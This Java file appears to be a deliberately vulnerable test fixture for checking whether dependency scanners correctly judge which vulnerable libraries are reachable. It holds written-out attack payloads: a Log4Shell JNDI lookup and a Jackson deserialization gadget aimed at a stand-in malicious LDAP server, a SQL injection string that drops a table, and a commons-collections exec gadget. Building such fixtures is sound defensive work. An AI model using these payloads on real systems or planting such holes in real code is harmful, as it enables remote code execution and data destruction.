package com.vulnerable;

// ---------------------------------------------------------------------------
// REACHABILITY GROUND TRUTH (for SCA reachability testing)
// ---------------------------------------------------------------------------
// The 6 vulnerable dependencies are wired into 6 DISTINCT call-graph patterns
// so a reachability engine can be validated against every case it might get
// wrong -- not just a flat reachable/unreachable split.
//
//   REACHABLE
//     - log4j-core         : direct call inside main() (1-hop)
//     - spring-core        : transitive / multi-hop  main -> a() -> b() -> vuln
//                            (SerializationUtils.deserialize -- unsafe deser sink)
//     - jackson-databind   : inside a conditional branch (statically reachable)
//
//   UNREACHABLE
//     - hibernate-core          : in a method never called from anywhere
//     - commons-collections     : transitively dead (called only by dead code)
//     - struts2-core            : declared in pom.xml but never imported at all
// ---------------------------------------------------------------------------

// -- Reachable imports (used from the main() call graph) --
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.util.SerializationUtils;
import com.fasterxml.jackson.databind.ObjectMapper;

// -- Unreachable imports (only used inside dead code never called from main) --
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.cfg.Configuration;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        // --- CASE 1: log4j-core -- REACHABLE (direct call in main, 1-hop) ---
        String userInput = "${jndi:ldap://malicious-server.com/exploit}";
        logger.info("User input: {}", userInput);

        // --- CASE 2: spring-core -- REACHABLE (transitive, multi-hop) -------
        reachableLevel1();

        // --- CASE 3: jackson-databind -- REACHABLE (conditional branch) -----
        maybeDeserialize(args.length >= 0); // always true; still a branch statically
    }

    // ===================== REACHABLE: transitive =========================
    // main() -> reachableLevel1() -> reachableLevel2() -> spring-core vuln
    static void reachableLevel1() {
        reachableLevel2();
    }

    static void reachableLevel2() {
        // spring-core (unsafe deserialization sink) -- REACHABLE via multi-hop chain
        try {
            byte[] payload = new byte[] { (byte) 0xac, (byte) 0xed, 0x00, 0x05 };
            Object obj = SerializationUtils.deserialize(payload);
            logger.info("Deserialized: {}", obj);
        } catch (Exception e) {
            logger.error("Spring deserialization error", e);
        }
    }

    // ===================== REACHABLE: conditional ========================
    static void maybeDeserialize(boolean enabled) {
        if (enabled) {
            // jackson-databind (deserialization RCE) -- REACHABLE (in-branch)
            try {
                ObjectMapper mapper = new ObjectMapper();
                mapper.enableDefaultTyping();
                String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://malicious-server/exploit\"}";
                mapper.readValue(json, Object.class);
            } catch (Exception e) {
                logger.error("Jackson deserialization error", e);
            }
        }
    }

    // ============ UNREACHABLE: direct dead method (never called) =========
    // Nothing references hibernateDeadCode(), so hibernate-core is unreachable
    // even though the vulnerable API is genuinely invoked below.
    public static void hibernateDeadCode() {
        try {
            SessionFactory sessionFactory = new Configuration()
                    .configure()
                    .buildSessionFactory();

            Session session = sessionFactory.openSession();
            String maliciousInput = "'; DROP TABLE users; --";
            String query = "FROM User WHERE name = '" + maliciousInput + "'";
            session.createQuery(query).list();
        } catch (Exception e) {
            logger.error("Database error", e);
        }
    }

    // ============ UNREACHABLE: transitively dead =========================
    // deadEntry() is never called from main(); it calls deadHelper(), which is
    // therefore also unreachable. commons-collections is reached only through
    // this dead chain -> UNREACHABLE. Tests transitive dead-code pruning.
    public static void deadEntry() {
        deadHelper();
    }

    static void deadHelper() {
        try {
            Map<String, String> innerMap = new HashMap<String, String>();
            innerMap.put("key", "value");

            InvokerTransformer transformer = new InvokerTransformer(
                "exec",
                new Class[] {String.class},
                new Object[] {"calc.exe"}
            );

            Map outerMap = TransformedMap.decorate(innerMap, null, transformer);
        } catch (Exception e) {
            logger.error("Commons Collections error", e);
        }
    }

    // NOTE: struts2-core is declared in pom.xml but intentionally never
    // imported or used anywhere in this source tree -> UNREACHABLE.
}
